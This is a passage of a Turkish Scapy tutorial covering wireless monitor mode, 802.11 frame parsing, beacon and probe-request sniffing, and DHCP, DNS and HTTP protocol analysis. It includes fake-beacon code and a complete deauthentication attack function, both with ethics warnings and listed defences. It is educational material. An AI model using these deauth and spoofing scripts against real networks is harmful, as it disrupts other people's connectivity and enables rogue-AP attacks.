Kablosuz ağ trafiğini (özellikle size doğrudan gönderilmeyen veya sizin tarafınızdan gönderilmeyen tüm paketleri) yakalayabilmek için kablosuz ağ kartınızın **monitör modunu (monitor mode)** desteklemesi ve bu moda alınması gerekir. Monitör modunda, ağ kartı tüm 802.11 çerçevelerini yakalar ve bunları işletim sistemine iletir; normal "managed mode"da ise sadece kendi MAC adresine veya broadcast/multicast adreslerine yönelik paketleri işler.

### Monitör Moduna Geçiş (Kali Linux'ta `airmon-ng`)
Kali Linux'ta `aircrack-ng` paketinin bir parçası olan `airmon-ng` aracı, kablosuz ağ kartlarını monitör moduna almak için yaygın olarak kullanılır.

1.  **Mevcut Arayüzleri Kontrol Etme:**
    ```bash
    iwconfig
    ```
    Bu komut, `wlan0`, `wlan1` gibi kablosuz arayüzlerinizi ve modlarını listeler.

2.  **Monitör Moduna Engel Olabilecek İşlemleri Durdurma (İsteğe Bağlı ama Önerilir):**
    ```bash
    sudo airmon-ng check kill
    ```
    Bu komut, NetworkManager gibi ağ yönetim servislerini geçici olarak durdurarak monitör modunun daha stabil çalışmasına yardımcı olabilir.

3.  **Monitör Modunu Başlatma:**
    ```bash
    sudo airmon-ng start wlan0 # 'wlan0' yerine kendi kablosuz arayüzünüzün adını yazın
    ```
    Bu komut, genellikle `wlan0mon` (veya `mon0`) gibi yeni bir monitör modu arayüzü oluşturacaktır. `iwconfig` ile yeni arayüzü ve modunu kontrol edin.

4.  **Monitör Modunu Durdurma ve Normal Moda Dönme:**
    ```bash
    sudo airmon-ng stop wlan0mon # 'wlan0mon' yerine monitör arayüzünüzün adını yazın
    # Gerekirse NetworkManager gibi servisleri yeniden başlatın:
    # sudo service NetworkManager start
    ```

**Scapy'de Kullanılacak Arayüz:**
Monitör moduna aldıktan sonra, Scapy'nin `sniff()`, `sendp()` gibi fonksiyonlarında `iface` parametresi olarak bu yeni monitör arayüzünü (örn: `"wlan0mon"`) kullanacaksınız.

### 802.11 Katmanları (`Dot11`, `Dot11Beacon`, `Dot11ProbeReq` vb.)
Scapy, 802.11 çerçevelerini temsil etmek için çeşitli katmanlar sunar:

*   **`Dot11`**: Genel 802.11 başlığı. Temel çerçeve bilgilerini içerir.
    *   `type`: Çerçeve tipi (0: Management, 1: Control, 2: Data).
    *   `subtype`: Çerçeve alt tipi (örn: Beacon için 8, Probe Request için 4).
    *   `addr1`: Alıcı Adresi (RA - Receiver Address).
    *   `addr2`: Gönderici Adresi (TA - Transmitter Address) veya Kaynak Adresi (SA - Source Address).
    *   `addr3`: Hedef Adres (DA - Destination Address), Kaynak Adres (SA) veya BSSID olabilir, çerçeve tipine göre değişir.
    *   `addr4`: Genellikle WDS (Wireless Distribution System) modunda kullanılır.
    *   `SC`: Sequence Control (Fragment ve Sequence numaralarını içerir).
    *   `FCfield`: Frame Control alanı (type, subtype, ToDS, FromDS, MoreFrag, Retry, PwrMgt, MoreData, Protected, Order bayraklarını içerir).

*   **`Dot11Beacon`**: Erişim Noktalarının (AP) periyodik olarak yayınladığı Beacon (işaret) çerçeveleri için gövde. Ağ hakkında bilgi (SSID, desteklenen hızlar, şifreleme türü vb.) içerir.
    *   `timestamp`: AP'nin TSF (Timing Synchronization Function) zaman damgası.
    *   `beacon_interval`: İki beacon arasındaki süre (genellikle 100 TU = 102.4 ms).
    *   `cap`: Yetenek bilgisi (Capability Information) alanı (ESS, IBSS, şifreleme vb.).

*   **`Dot11ProbeReq`**: İstemcilerin (client) yakındaki AP'leri veya belirli bir SSID'ye sahip bir AP'yi bulmak için gönderdiği Probe Request (keşif isteği) çerçeveleri için gövde.

*   **`Dot11ProbeResp`**: AP'lerin Probe Request'lere cevap olarak gönderdiği Probe Response (keşif cevabı) çerçeveleri için gövde. Beacon'a benzer bilgiler içerir.

*   **`Dot11AssoReq` / `Dot11AssoResp`**: İstemcinin bir AP'ye bağlanma (association) isteği ve AP'nin cevabı.
*   **`Dot11Auth`**: Kimlik doğrulama çerçeveleri (Open System, Shared Key).
*   **`Dot11Deauth`**: Deauthentication (bağlantıyı sonlandırma) çerçevesi.
*   **`Dot11Disas`**: Disassociation (ilişkiyi sonlandırma) çerçevesi.

*   **`Dot11Elt` (Element)**: Management çerçevelerinin (Beacon, ProbeResp vb.) gövdesinde bulunan "Information Elements" (IE) için genel katman. Her IE'nin bir ID'si, uzunluğu ve değeri vardır.
    *   `ID`: Element ID (örn: 0 SSID için, 1 Rates için, 3 DSset (kanal) için, 48 RSN (Robust Security Network - WPA/WPA2) için).
    *   `len`: Değer alanının uzunluğu.
    *   `info`: Değer.

*   **`RadioTap`**: Çoğu kablosuz kart sürücüsü, yakalanan 802.11 çerçevelerinin başına bu katmanı ekler. Fiziksel katman hakkında ek bilgiler içerir (sinyal gücü, gürültü seviyesi, kanal, veri hızı vb.). Scapy ile paket gönderirken genellikle `RadioTap` başlığını eklemeniz gerekmez, sürücü bunu halleder. Ancak dinlerken bu başlığı görebilirsiniz.

**Paket Oluşturma Örneği (Beacon Çerçevesi):**
```python
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, sniff

# Basit bir sahte Beacon çerçevesi
dot11_layer = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", # Alıcı (Broadcast)
                    addr2="00:11:22:33:44:55", # Gönderici (AP'nin MAC'i)
                    addr3="00:11:22:33:44:55") # BSSID (AP'nin MAC'i)

beacon_layer = Dot11Beacon(cap="ESS+privacy") # ESS (Infrastructure mode), privacy (WEP/WPA)

# SSID elementi
essid = "BenimSahteAP"
ssid_element = Dot11Elt(ID="SSID", info=essid, len=len(essid))

# Desteklenen hızlar elementi (örnek)
rates_element = Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') # 1, 2, 5.5, 11, 6, 9, 12, 18 Mbps

# Kanal elementi (DS Parameter Set)
channel = 6
ds_element = Dot11Elt(ID="DSset", info=chr(channel).encode(), len=1) # Kanalı byte olarak kodla

# RSN (WPA2) bilgisi için daha karmaşık bir Dot11Elt gerekir (örneğin Dot11EltRSN)

sahte_beacon_paketi = RadioTap()/dot11_layer/beacon_layer/ssid_element/rates_element/ds_element

# sahte_beacon_paketi.show()
# sendp(sahte_beacon_paketi, iface="wlan0mon", loop=1, inter=0.1, verbose=False) # Dikkatli kullanın!
```
**Not:** Sahte AP veya Beacon göndermek, yakındaki kullanıcıların kafasını karıştırabilir ve ağ sorunlarına yol açabilir. Sadece test ortamınızda deneyin.

### Beacon Çerçevelerini Yakalama ve Analiz Etme
Erişim Noktaları (AP'ler) varlıklarını ve ağ yapılandırmalarını duyurmak için periyodik olarak Beacon çerçeveleri yayınlarlar.

```python
def beacon_analyzer(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2  # AP'nin MAC adresi (Gönderici Adresi)
        # Beacon çerçevelerinde addr3 de genellikle BSSID'dir.
        
        ssid = ""
        channel = ""
        crypto = set() # Şifreleme türlerini saklamak için

        # Dot11Elt katmanlarını dolaşarak SSID, Kanal ve Şifreleme bilgilerini çıkar
        elt_layer = packet[Dot11Elt]
        while isinstance(elt_layer, Dot11Elt):
            if elt_layer.ID == 0: # SSID
                try:
                    ssid = elt_layer.info.decode('utf-8', errors='ignore')
                except Exception:
                    ssid = elt_layer.info.hex() # Decode edilemezse hex olarak göster
            elif elt_layer.ID == 3: # DSset (Kanal)
                try:
                    channel = str(ord(elt_layer.info))
                except TypeError: # Bazen info boş gelebilir
                    channel = "N/A"

            # Şifreleme Tespiti (Basit Yaklaşım)
            # Dot11Beacon.cap alanı da ipuçları verir (örn: 'privacy' biti)
            if packet[Dot11Beacon].cap.privacy: # privacy biti 1 ise WEP, WPA veya WPA2
                crypto.add("WEP/WPAx?") # Daha detaylı analiz gerekir

            if elt_layer.ID == 48: # RSN (Robust Security Network - WPA/WPA2/WPA3)
                crypto.discard("WEP/WPAx?") # Daha spesifik bilgi var
                # RSN elementinin içeriği daha detaylı parse edilebilir
                # Örn: AKM (Authentication and Key Management) suite selector
                # 00-0F-AC-01: WPA-PSK
                # 00-0F-AC-02: WPA2-PSK (AES)
                # 00-0F-AC-04: WPA2-Enterprise (AES)
                # 00-0F-AC-08: WPA3-SAE
                # Basitlik için sadece RSN varlığını belirtelim
                crypto.add("WPA2/WPA3") # Genelleme
            elif elt_layer.ID == 221: # Vendor Specific (WPA için kullanılabilir - ID 221, OUI 00:50:f2, Type 1)
                if elt_layer.info.startswith(b'\x00P\xf2\x01\x01\x00'): # Microsoft WPA IE
                     crypto.discard("WEP/WPAx?")
                     crypto.add("WPA")
            
            try:
                elt_layer = elt_layer.payload # Bir sonraki Dot11Elt'e geç
            except AttributeError:
                break
        
        if not crypto and not packet[Dot11Beacon].cap.privacy:
            crypto.add("OPEN")

        # RadioTap başlığından sinyal gücünü alabiliriz (eğer varsa)
        signal_strength = "N/A"
        if packet.haslayer(RadioTap) and hasattr(packet[RadioTap], 'dbm_antsignal'):
            signal_strength = str(packet[RadioTap].dbm_antsignal) + " dBm"
            
        print(f"BSSID: {bssid} | SSID: {ssid:<20} | Kanal: {channel:<3} | Şifreleme: {', '.join(crypto):<15} | Sinyal: {signal_strength}")

# Monitör arayüzünüzü kullanın (örn: "wlan0mon")
# print("Beacon çerçeveleri dinleniyor (Ctrl+C ile durdur)...")
# sniff(iface="wlan0mon", prn=beacon_analyzer, filter="type mgt subtype beacon", store=0)
```
**Not:** Şifreleme tespiti için RSN (ID 48) ve Vendor Specific (ID 221, Microsoft OUI 00:50:f2, Type 1) IE'lerinin daha detaylı parse edilmesi gerekir. `scapy.layers.dot11.Dot11EltRSN` ve benzeri özel IE katmanları bu konuda yardımcı olabilir.

### Probe Request/Response Paketlerini İnceleme
*   **Probe Request:** Bir istemci (laptop, telefon vb.) yakındaki ağları bulmak veya belirli bir SSID'ye sahip bir AP'yi aramak için Probe Request gönderir. Eğer belirli bir SSID arıyorsa, bu SSID `Dot11Elt` içinde ID 0 ile belirtilir. SSID belirtilmemişse (broadcast probe request), tüm AP'ler cevap verebilir.
*   **Probe Response:** Bir AP, aldığı Probe Request'e cevap olarak Probe Response gönderir. İçeriği genellikle Beacon çerçevesine benzer.

```python
discovered_clients = {} # Probe request gönderen istemcileri saklamak için

def probe_req_analyzer(packet):
    if packet.haslayer(Dot11ProbeReq):
        client_mac = packet[Dot11].addr2 # Probe request'i gönderen istemcinin MAC'i
        ssid_requested = ""
        
        elt_layer = packet[Dot11Elt]
        while isinstance(elt_layer, Dot11Elt):
            if elt_layer.ID == 0 and elt_layer.len > 0: # SSID elementi ve boş değilse
                try:
                    ssid_requested = elt_layer.info.decode('utf-8', errors='ignore')
                except:
                    ssid_requested = elt_layer.info.hex()
                break # Genellikle tek SSID olur
            try:
                elt_layer = elt_layer.payload
            except AttributeError:
                break

        if not ssid_requested:
            ssid_requested = "<Broadcast>" # Belirli bir SSID sormuyorsa

        if client_mac not in discovered_clients:
            discovered_clients[client_mac] = set()
        discovered_clients[client_mac].add(ssid_requested)
            
        print(f"Probe Request: İstemci MAC: {client_mac} -> Aranan SSID: {ssid_requested}")
        # Bu bilgiyi kullanarak hangi cihazların hangi ağları aradığını (veya daha önce bağlandığını) öğrenebiliriz.

# print("\nProbe Request çerçeveleri dinleniyor (Ctrl+C ile durdur)...")
# sniff(iface="wlan0mon", prn=probe_req_analyzer, filter="type mgt subtype probe-req", store=0)
# print("\nTespit Edilen İstemciler ve Aradıkları SSID'ler:")
# for mac, ssids in discovered_clients.items():
#     print(f"  {mac}: {', '.join(ssids)}")
```

### Deauthentication/Disassociation Saldırısı (Etik Uyarılarla!)
Bu saldırı, bir Erişim Noktası (AP) veya bir istemci (client) adına sahte Deauthentication veya Disassociation çerçeveleri göndererek, hedeflenen istemcinin AP ile olan bağlantısını zorla kesmeyi amaçlar. **Bu saldırı, hedef ağın çalışmasını ciddi şekilde aksatabilir ve yasa dışı kullanımı ciddi sonuçlar doğurur. Sadece kendi test ağınızda ve eğitim amacıyla, sonuçlarını anlayarak deneyin!**

**Çalışma Mantığı:**
*   802.11 standardında Management çerçeveleri (Deauth/Disas dahil) genellikle şifrelenmez ve kimlik doğrulaması yapılmaz.
*   Saldırgan, hedeflenen istemcinin MAC adresini ve bağlı olduğu AP'nin BSSID'sini bilir.
*   **İstemciyi AP'den Düşürmek İçin:** Saldırgan, AP adına (kaynak MAC = AP BSSID) istemciye (hedef MAC = istemci MAC) bir Deauth çerçevesi gönderir.
*   **AP'yi İstemciden Düşürmek İçin (Daha Az Etkili):** Saldırgan, istemci adına (kaynak MAC = istemci MAC) AP'ye (hedef MAC = AP BSSID) bir Deauth çerçevesi gönderir.
*   En etkilisi, her iki yönde de Deauth göndermek veya istemciye broadcast Deauth (hedef MAC = `ff:ff:ff:ff:ff:ff`) göndermektir (kaynak AP BSSID).

```python
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

def deauth_attack(target_mac, bssid, interface="wlan0mon", count=10, reason_code=7):
    """
    Belirtilen istemciyi AP'den düşürmek için Deauthentication paketleri gönderir.
    target_mac: Hedef istemcinin MAC adresi.
    bssid: Erişim Noktasının (AP) BSSID'si (MAC adresi).
    reason_code: Deauthentication sebep kodu (örn: 7 = Class 3 frame received from nonassociated STA).
    """
    print(f"[*] Deauthentication saldırısı başlatılıyor:")
    print(f"  Arayüz: {interface}")
    print(f"  Hedef İstemci MAC: {target_mac}")
    print(f"  AP BSSID: {bssid}")
    print(f"  Gönderilecek Paket Sayısı: {count}")

    # İstemciye AP'den geliyormuş gibi Deauth paketi
    # addr1=target_mac (Alıcı), addr2=bssid (Gönderici), addr3=bssid (BSSID)
    deauth_packet_to_client = RadioTap() / \
                              Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / \
                              Dot11Deauth(reason=reason_code)

    # (İsteğe bağlı) AP'ye istemciden geliyormuş gibi Deauth paketi
    # addr1=bssid (Alıcı), addr2=target_mac (Gönderici), addr3=target_mac (BSSID değil, istemci)
    # Bu genellikle daha az etkilidir ve BSSID olarak AP'nin MAC'i kullanılmalıdır.
    # Daha doğru: addr1=bssid, addr2=target_mac, addr3=bssid
    deauth_packet_to_ap = RadioTap() / \
                          Dot11(type=0, subtype=12, addr1=bssid, addr2=target_mac, addr3=bssid) / \
                          Dot11Deauth(reason=reason_code)
    
    print("[*] Paketler gönderiliyor...")
    for i in range(count):
        sendp(deauth_packet_to_client, iface=interface, verbose=False, inter=0.1)
        sendp(deauth_packet_to_ap, iface=interface, verbose=False, inter=0.1) # İsteğe bağlı
        print(f"\r[*] Gönderilen Deauth çifti: {i + 1}/{count}", end="")
        sys.stdout.flush()
    print("\n[+] Deauthentication paketleri gönderildi.")

# KULLANIM ÖRNEĞİ (ÇOK DİKKATLİ OLUN! SADECE KENDİ TEST AĞINIZDA!)
# Bir istemcinin MAC adresini ve bağlı olduğu AP'nin BSSID'sini bilmeniz gerekir.
# Bunları 'airodump-ng wlan0mon' gibi araçlarla veya Scapy ile dinleyerek bulabilirsiniz.
#
# client_to_kick = "AA:BB:CC:DD:EE:FF" # Test edilecek istemcinin MAC'i
# ap_bssid = "11:22:33:44:55:66"       # Test AP'sinin BSSID'si
# monitor_interface = "wlan0mon"
#
# deauth_attack(client_to_kick, ap_bssid, monitor_interface, count=20)
```
**Savunma Yöntemleri:**
*   **802.11w (Management Frame Protection - MFP):** Bu standart, bazı Management çerçevelerinin (Deauth, Disas, Action) şifrelenmesini ve bütünlüğünün korunmasını sağlar. Hem AP'nin hem de istemcinin MFP'yi desteklemesi gerekir. WPA3, MFP'yi zorunlu kılar.
*   **IDS/IPS Sistemleri:** Anormal sayıda Deauth çerçevesi tespit edebilir.
*   **Sinyal Gücü Analizi:** Sahte Deauth çerçeveleri genellikle saldırganın konumuna bağlı olarak daha zayıf bir sinyal gücüne sahip olabilir.

### Kablosuz Trafik Enjeksiyonu
Monitör modundaki bir kablosuz kart ve Scapy kullanılarak, ağa özel hazırlanmış 802.11 çerçeveleri enjekte edilebilir. Yukarıdaki Deauth saldırısı ve sahte Beacon gönderme bunun örnekleridir.
Diğer potansiyel enjeksiyon senaryoları:
*   **Sahte Probe Responses:** İstemcileri sahte bir AP'ye yönlendirmek (örn: Karma saldırıları).
*   **Data Çerçeveleri Enjeksiyonu:** Eğer şifreleme anahtarları biliniyorsa veya ağ açıksa, sahte data paketleri enjekte edilebilir. WEP gibi zayıf şifrelemelerde, anahtar bilinmese bile bazı durumlarda trafik enjekte edilebilir (örn: ARP replay attack ile WEP anahtarını kırmak veya paket enjekte etmek).
*   **RTS/CTS Manipülasyonu:** Ağ erişimini kontrol eden RTS/CTS çerçevelerini manipüle ederek DoS saldırıları.

**Genel Enjeksiyon Komutu:**
```python
# Herhangi bir özel hazırlanmış 802.11 paketi
# custom_dot11_packet = RadioTap()/Dot11(...)/... 
# sendp(custom_dot11_packet, iface="wlan0mon", count=1, inter=0.1, verbose=False)
```
**Önemli Not:** Paket enjeksiyonu, kablosuz kartınızın ve sürücüsünün bu yeteneği desteklemesine bağlıdır. Bazı kartlar sadece dinleme yapabilirken, bazıları ham paket enjeksiyonunu destekler. `aireplay-ng -9 wlan0mon` (test enjeksiyonu) komutuyla kartınızın enjeksiyon yeteneğini test edebilirsiniz.

---

## 9. Protokol Analizi ve Sorun Giderme

Scapy, ağ protokollerinin nasıl çalıştığını anlamak, normal olmayan davranışları tespit etmek ve ağ sorunlarını gidermek için mükemmel bir araçtır. Bu bölümde, bazı yaygın protokollerin akışlarını Scapy ile nasıl yakalayıp analiz edebileceğimizi ve sorun giderme senaryolarında nasıl kullanabileceğimizi inceleyeceğiz.

### DHCP Protokol Akışını İzleme (DORA)
DHCP (Dynamic Host Configuration Protocol), ağa bağlanan cihazlara otomatik olarak IP adresi, alt ağ maskesi, ağ geçidi ve DNS sunucusu gibi yapılandırma bilgilerini atar. Temel DHCP süreci DORA olarak bilinir:
1.  **Discover:** İstemci, ağdaki bir DHCP sunucusunu bulmak için broadcast olarak bir DHCPDISCOVER mesajı gönderir.
2.  **Offer:** Ağdaki DHCP sunucuları, istemciye bir IP adresi ve diğer yapılandırma bilgilerini içeren bir DHCPOFFER mesajı ile cevap verir (genellikle unicast veya broadcast).
3.  **Request:** İstemci, gelen tekliflerden birini seçer (genellikle ilk geleni) ve bu teklifi kabul ettiğini belirtmek için bir DHCPREQUEST mesajı gönderir (genellikle broadcast). Bu mesajda hangi sunucunun teklifini kabul ettiğini belirtir.
4.  **Acknowledge (ACK):** Seçilen DHCP sunucusu, IP adresinin istemciye atandığını onaylamak için bir DHCPACK mesajı gönderir.

**Scapy ile DHCP Trafiğini Dinleme ve Analiz Etme:**
DHCP, UDP protokolünü kullanır. İstemciler 68 numaralı portu, sunucular ise 67 numaralı portu kullanır.

```python
from scapy.all import sniff, BOOTP, DHCP, Ether

def dhcp_analyzer(packet):
    if packet.haslayer(DHCP): # BOOTP katmanı DHCP için temeldir
        dhcp_options = packet[DHCP].options
        message_type_code = None
        for option in dhcp_options:
            if isinstance(option, tuple) and option[0] == 'message-type':
                message_type_code = option[1]
                break
        
        message_types = {
            1: "Discover", 2: "Offer", 3: "Request", 4: "Decline",
            5: "ACK", 6: "NAK", 7: "Release", 8: "Inform"
        }
        
        msg_type_str = message_types.get(message_type_code, f"Bilinmeyen ({message_type_code})")
        
        client_mac = packet[Ether].src if packet[Ether].src != "ff:ff:ff:ff:ff:ff" else packet[BOOTP].chaddr.hex()[:-4] # chaddr'dan MAC al
        # chaddr (client hardware address) bazen padding içerebilir, son 4 byte'ı atmak gerekebilir.
        # Daha düzgün bir MAC formatı için: ':'.join(packet[BOOTP].chaddr.hex()[i:i+2] for i in range(0,12,2))
        
        print(f"DHCP Mesajı: {msg_type_str}")
        print(f"  İstemci MAC (chaddr): {':'.join(packet[BOOTP].chaddr.hex()[i:i+2] for i in range(0,12,2))}")
        if packet[BOOTP].giaddr != "0.0.0.0": # Gateway IP (Relay agent)
            print(f"  Relay Agent IP (giaddr): {packet[BOOTP].giaddr}")
        
        if message_type_code == 1: # Discover
            if packet[BOOTP].ciaddr != "0.0.0.0": # Client IP
                 print(f"  İstemci IP (ciaddr): {packet[BOOTP].ciaddr} (Zaten bir IP'si var gibi)")
        elif message_type_code == 2: # Offer
            print(f"  Önerilen IP (yiaddr): {packet[BOOTP].yiaddr}")
            print(f"  Sunucu IP (siaddr): {packet[BOOTP].siaddr if packet[BOOTP].siaddr != '0.0.0.0' else packet[IP].src}")
        elif message_type_code == 3: # Request
            requested_ip = "N/A"
            server_identifier = "N/A"
            for option in dhcp_options:
                if isinstance(option, tuple):
                    if option[0] == 'requested_addr':
                        requested_ip = option[1]
                    elif option[0] == 'server_id':
                        server_identifier = option[1]
            print(f"  İstenen IP: {requested_ip}")
            print(f"  Hedef Sunucu: {server_identifier}")
        elif message_type_code == 5: # ACK
            print(f"  Atanan IP (yiaddr): {packet[BOOTP].yiaddr}")
            print(f"  Sunucu IP (siaddr): {packet[BOOTP].siaddr if packet[BOOTP].siaddr != '0.0.0.0' else packet[IP].src}")
            lease_time = "N/A"
            dns_servers = []
            router = "N/A"
            for option in dhcp_options:
                if isinstance(option, tuple):
                    if option[0] == 'lease_time':
                        lease_time = str(option[1]) + " saniye"
                    elif option[0] == 'name_server': # DNS server(s)
                        dns_servers = option[1:] if isinstance(option[1], list) else [option[1]]
                    elif option[0] == 'router': # Gateway
                        router = option[1]
            print(f"  Kira Süresi: {lease_time}")
            if dns_servers: print(f"  DNS Sunucuları: {', '.join(dns_servers)}")
            if router != "N/A": print(f"  Ağ Geçidi (Router): {router}")
        
        print("-" * 30)

# print("DHCP trafiği dinleniyor (UDP port 67 veya 68)... (Ctrl+C ile durdur)")
# sniff(filter="udp and (port 67 or port 68)", prn=dhcp_analyzer, store=0, iface="eth0")
# Yeni bir cihaz ağa bağlandığında veya 'sudo dhclient -r eth0 && sudo dhclient eth0' gibi komutlarla IP yenilendiğinde DORA sürecini görebilirsiniz.
```
**Sorun Giderme Senaryoları:**
*   **İstemci IP Alamıyor:** `Discover` mesajları var ama `Offer` yoksa, DHCP sunucusu çalışmıyor, ulaşılamıyor veya yapılandırma sorunu olabilir.
*   **Yanlış IP Teklifi:** `Offer` mesajındaki IP adresinin ağınız için geçerli olup olmadığını kontrol edin.
*   **Birden Fazla DHCP Sunucusu:** Ağda yetkisiz (rogue) bir DHCP sunucusu olabilir. Farklı `Offer` mesajlarını inceleyin.
*   **Kısa Kira Süreleri:** `ACK` mesajındaki `lease_time` çok kısaysa, istemciler sık sık IP yenilemek zorunda kalabilir.

### DNS Sorgu ve Cevaplarını Detaylı İnceleme
DNS (Domain Name System), alan adlarını IP adreslerine (ve tersi) çevirir. Genellikle UDP port 53 üzerinden çalışır (büyük cevaplar veya zone transferleri için TCP de kullanılabilir).

```python
from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP

def dns_analyzer(packet):
    if packet.haslayer(DNS):
        dns_layer = packet[DNS]
        
        # Sorgu mu Cevap mı?
        # qr=0: Sorgu (Query)
        # qr=1: Cevap (Response)
        if dns_layer.qr == 0: # Sorgu
            if dns_layer.qdcount > 0 and dns_layer.qd: # Question Data var mı?
                query_name = dns_layer.qd.qname.decode('utf-8', errors='ignore')
                query_type_val = dns_layer.qd.qtype
                query_types = {1:"A", 2:"NS", 5:"CNAME", 6:"SOA", 12:"PTR", 15:"MX", 16:"TXT", 28:"AAAA", 255:"ANY"}
                query_type_str = query_types.get(query_type_val, str(query_type_val))
                print(f"DNS Sorgusu ({packet[IP].src} -> {packet[IP].dst}):")
                print(f"  ID: {dns_layer.id}")
                print(f"  Alan Adı: {query_name}")
                print(f"  Sorgu Tipi: {query_type_str} ({query_type_val})")
                if dns_layer.rd: print("  Rekürsiyon İsteniyor (RD=1)")
                
        elif dns_layer.qr == 1: # Cevap
            print(f"DNS Cevabı ({packet[IP].src} -> {packet[IP].dst}):")
            print(f"  ID: {dns_layer.id}")
            if dns_layer.qdcount > 0 and dns_layer.qd:
                print(f"  Sorgulanan Alan: {dns_layer.qd.qname.decode('utf-8', errors='ignore')}")

            # Cevap Kodları (rcode)
            # 0: No error, 1: Format error, 2: Server failure, 3: Name Error (NXDOMAIN)
            rcode_val = dns_layer.rcode
            rcodes = {0:"No Error", 1:"Format Error", 2:"Server Failure", 3:"Name Error (NXDOMAIN)", 4:"Not Implemented", 5:"Refused"}
            rcode_str = rcodes.get(rcode_val, str(rcode_val))
            print(f"  Cevap Kodu: {rcode_str} ({rcode_val})")

            if dns_layer.ancount > 0 and dns_layer.an: # Answer records
                print("  Cevap Kayıtları (Answers):")
                # DNSRR katmanlarını dolaş
                current_rr = dns_layer.an
                for _ in range(dns_layer.ancount):
                    if current_rr:
                        rr_name = current_rr.rrname.decode('utf-8', errors='ignore')
                        rr_type_val = current_rr.type
                        rr_types = {1:"A", 2:"NS", 5:"CNAME", 6:"SOA", 12:"PTR", 15:"MX", 16:"TXT", 28:"AAAA"}
                        rr_type_str = rr_types.get(rr_type_val, str(rr_type_val))
                        rr_ttl = current_rr.ttl
                        rr_data = "N/A"
                        if hasattr(current_rr, 'rdata'):
                            # rdata'nın tipi A, AAAA, CNAME, MX, NS, PTR, SOA vb. için farklılık gösterir.
                            # Scapy genellikle rdata'yı string olarak veya uygun bir formatta verir.
                            if isinstance(current_rr.rdata, bytes):
                                try:
                                    rr_data = current_rr.rdata.decode('utf-8', errors='ignore')
                                except: # Eğer decode edilemezse (örn: bazı TXT kayıtları)
                                    rr_data = current_rr.rdata.hex()
                            else:
                                rr_data = str(current_rr.rdata)
                        
                        print(f"    {rr_name:<25} TTL: {rr_ttl:<6} Tip: {rr_type_str:<5} Veri: {rr_data}")
                        if hasattr(current_rr, 'payload') and isinstance(current_rr.payload, DNSRR):
                            current_rr = current_rr.payload
                        else:
                            break # Daha fazla cevap kaydı yok
                    else:
                        break
            # Benzer şekilde Authority (nscount, ns) ve Additional (arcount, ar) kayıtları da parse edilebilir.
        print("-" * 40)

# print("DNS trafiği dinleniyor (UDP port 53)... (Ctrl+C ile durdur)")
# sniff(filter="udp port 53", prn=dns_analyzer, store=0, iface="eth0")
```
**Sorun Giderme Senaryoları:**
*   **Alan Adı Çözümlenemiyor:**
    *   Sorgular var ama cevap yoksa: DNS sunucusu çalışmıyor, ulaşılamıyor veya sorguyu işleyemiyor.
    *   Cevap `Name Error (NXDOMAIN)` ise: Alan adı mevcut değil veya DNS sunucusu bu kaydı bilmiyor.
    *   Cevap `Server Failure` ise: DNS sunucusunda bir sorun var.
*   **Yanlış IP Adresi:** Cevaptaki IP adresinin beklenen adres olup olmadığını kontrol edin. DNS zehirlenmesi veya yanlış yapılandırma olabilir.
*   **Yavaş DNS Çözümlemesi:** Sorgu ile cevap arasındaki süreyi izleyin. Farklı DNS sunucularını test edin.
*   **Rekürsiyon Sorunları:** `rd=1` (recursion desired) ile gönderilen sorgulara, `ra=1` (recursion available) ile cevap gelmiyorsa, DNS sunucusu rekürsif sorguları desteklemiyor veya izin vermiyor olabilir.

### HTTP Trafiğini Yakalama ve Basit Analiz
HTTP (HyperText Transfer Protocol) genellikle TCP port 80 (HTTPS için TCP port 443) üzerinden çalışır. Scapy'nin yerleşik bir HTTP katmanı yoktur, bu yüzden HTTP trafiği TCP katmanının üzerindeki `Raw` katmanında metin olarak bulunur. HTTPS trafiği ise şifreli olduğu için Scapy ile doğrudan içeriği görülemez (ancak MitM teknikleriyle ve SSL/TLS sonlandırma ile mümkün olabilir, bu rehberin kapsamı dışındadır).

```python
from scapy.all import sniff, TCP, Raw

def http_analyzer(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        # HTTP istekleri genellikle GET, POST, PUT, DELETE vb. ile başlar
        # HTTP cevapları genellikle HTTP/1.1 200 OK, HTTP/1.1 404 Not Found vb. ile başlar
        
        try:
            decoded_payload = payload.decode('utf-8', errors='ignore')
        except Exception:
            return # Decode edilemiyorsa geç

        # Basit HTTP İsteği Tespiti
        http_methods = [b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ", b"OPTIONS ", b"CONNECT ", b"TRACE ", b"PATCH "]
        is_request = any(payload.startswith(method) for method in http_methods)

        # Basit HTTP Cevabı Tespiti
        is_response = payload.startswith(b"HTTP/")

        if is_request:
            print(f"HTTP İsteği ({packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}):")
            try:
                # İstek satırını ve bazı başlıkları al
                request_line = decoded_payload.splitlines()[0]
                host_header = ""
                user_agent_header = ""
                for line in decoded_payload.splitlines():
                    if line.lower().startswith("host:"):
                        host_header = line
                    elif line.lower().startswith("user-agent:"):
                        user_agent_header = line
                print(f"  {request_line}")
                if host_header: print(f"  {host_header}")
                if user_agent_header: print(f"  {user_agent_header}")
            except IndexError:
                print(f"  Payload (kısmi):\n{decoded_payload[:200]}") # Eğer parse edilemezse
            print("-" * 30)

        elif is_response:
            print(f"HTTP Cevabı ({packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}):")
            try:
                status_line = decoded_payload.splitlines()[0]
                server_header = ""
                content_type_header = ""
                for line in decoded_payload.splitlines():
                    if line.lower().startswith("server:"):
                        server_header = line
                    elif line.lower().startswith("content-type:"):
                        content_type_header = line
                print(f"  {status_line}")
                if server_header: print(f"  {server_header}")
                if content_type_header: print(f"  {content_type_header}")
            except IndexError:
                print(f"  Payload (kısmi):\n{decoded_payload[:200]}")
            print("-" * 30)

# print("HTTP trafiği dinleniyor (TCP port 80)... (Ctrl+C ile durdur)")
# sniff(filter="tcp port 80", prn=http_analyzer, store=0, iface="eth0")
# Bir web tarayıcısında http:// ile başlayan bir siteye gidin (örn: http://httpforever.com/)
```
